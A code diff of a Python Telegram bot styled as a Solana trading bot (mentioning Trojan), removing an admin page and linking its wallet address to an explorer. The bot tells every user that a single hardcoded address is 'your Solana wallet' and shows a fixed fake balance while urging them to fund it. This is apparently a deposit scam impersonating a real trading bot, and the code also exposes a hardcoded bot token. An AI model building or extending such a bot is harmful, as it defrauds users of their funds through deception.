@@ -7,9 +7,6 @@ import os
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# Define the admin Telegram user ID
-ADMIN_ID = 5698476270  # Replace with your Telegram user ID
-
 # Function to clear existing webhook (important for resolving conflicts)
 def clear_webhook():
     bot = Bot("7761108718:AAFmR_1ZtMAXX8DBi_r3BCo7418MtK6C1GU")
@@ -31,25 +28,14 @@ def main_menu_keyboard():
         InlineKeyboardButton("Copy Trade", callback_data="copy_trade"),
         InlineKeyboardButton("Settings", callback_data="settings"),
     ], [
-        InlineKeyboardButton("Admin Page", callback_data="admin_page"),
         InlineKeyboardButton("Help", callback_data="help"),
-    ]])
-
-# Admin Page Keyboard with additional options
-def admin_page_keyboard():
-    return InlineKeyboardMarkup([[
-        InlineKeyboardButton("User Stats", callback_data="user_stats"),
-        InlineKeyboardButton("Bot Activity Logs", callback_data="bot_logs"),
-    ], [
-        InlineKeyboardButton("Database Status", callback_data="db_status"),
-        InlineKeyboardButton("Back to Main Menu", callback_data="back_to_main"),
     ]])
 
 # Function to handle the /start command
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     # Video path (use the correct path to your video)
     video_path = "C:/Users/IYOHA ODUTOLA/Documents/new python bot/WhatsApp Video 2024-12-03 at 12.58.12 AM.mp4"
-    
+
     try:
         # Check if the video exists and send it
         if os.path.exists(video_path):
@@ -66,16 +52,15 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     except Exception as e:
         logger.error(f"Error sending video: {e}")
         await update.message.reply_text("Error: Could not send video.")
-    
+
     # Send the welcome text
     welcome_message = (
         "Introducing a cutting-edge bot crafted exclusively for Solana Traders. "
         "Trade any token instantly right after launch.\n\n"
         "Here's your Solana wallet address linked to your Telegram account. "
         "Simply fund your wallet and dive into trading.\n\n"
-        "Solana\n\n"
-        "[CTbFNi9v996i1Xbrg2QRXjJhXvLPiZAhqaG3HNkMfgat\n]"
-        "(tap to copy)\n\n"
+        "Solana Wallet Address:\n"
+        "[CTbFNi9v996i1Xbrg2QRXjJhXvLPiZAhqaG3HNkMfgat](https://explorer.solana.com/address/CTbFNi9v996i1Xbrg2QRXjJhXvLPiZAhqaG3HNkMfgat)\n\n"
         "Balance: (2.419) SOL\n\n"
         "Click on the Refresh button to update your current balance.\n\n"
         "Join our Telegram group @trojan for users of Trojan!\n\n"
@@ -90,7 +75,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 # Function to handle button presses
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     query = update.callback_query
-    user_id = query.from_user.id  # Get the user ID to check admin rights
     await query.answer()
 
     # Handle the main menu buttons
@@ -166,16 +150,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
             "You can contact our support team or join our Telegram group for updates."
         )
         await query.edit_message_text(help_message, reply_markup=main_menu_keyboard())
-    elif query.data == "admin_page":
-        admin_page_message = (
-            "Admin Page 🔒\n\n"
-            "Only accessible by the admin.\n\n"
-            "You can manage the bot settings here and monitor user activities."
-        )
-        await query.edit_message_text(admin_page_message, reply_markup=admin_page_keyboard())
-    elif query.data == "back_to_main":
-        # Go back to the main menu
-        await query.edit_message_text("Returning to main menu...", reply_markup=main_menu_keyboard())
 
 # Function to set up polling
 def run_bot():
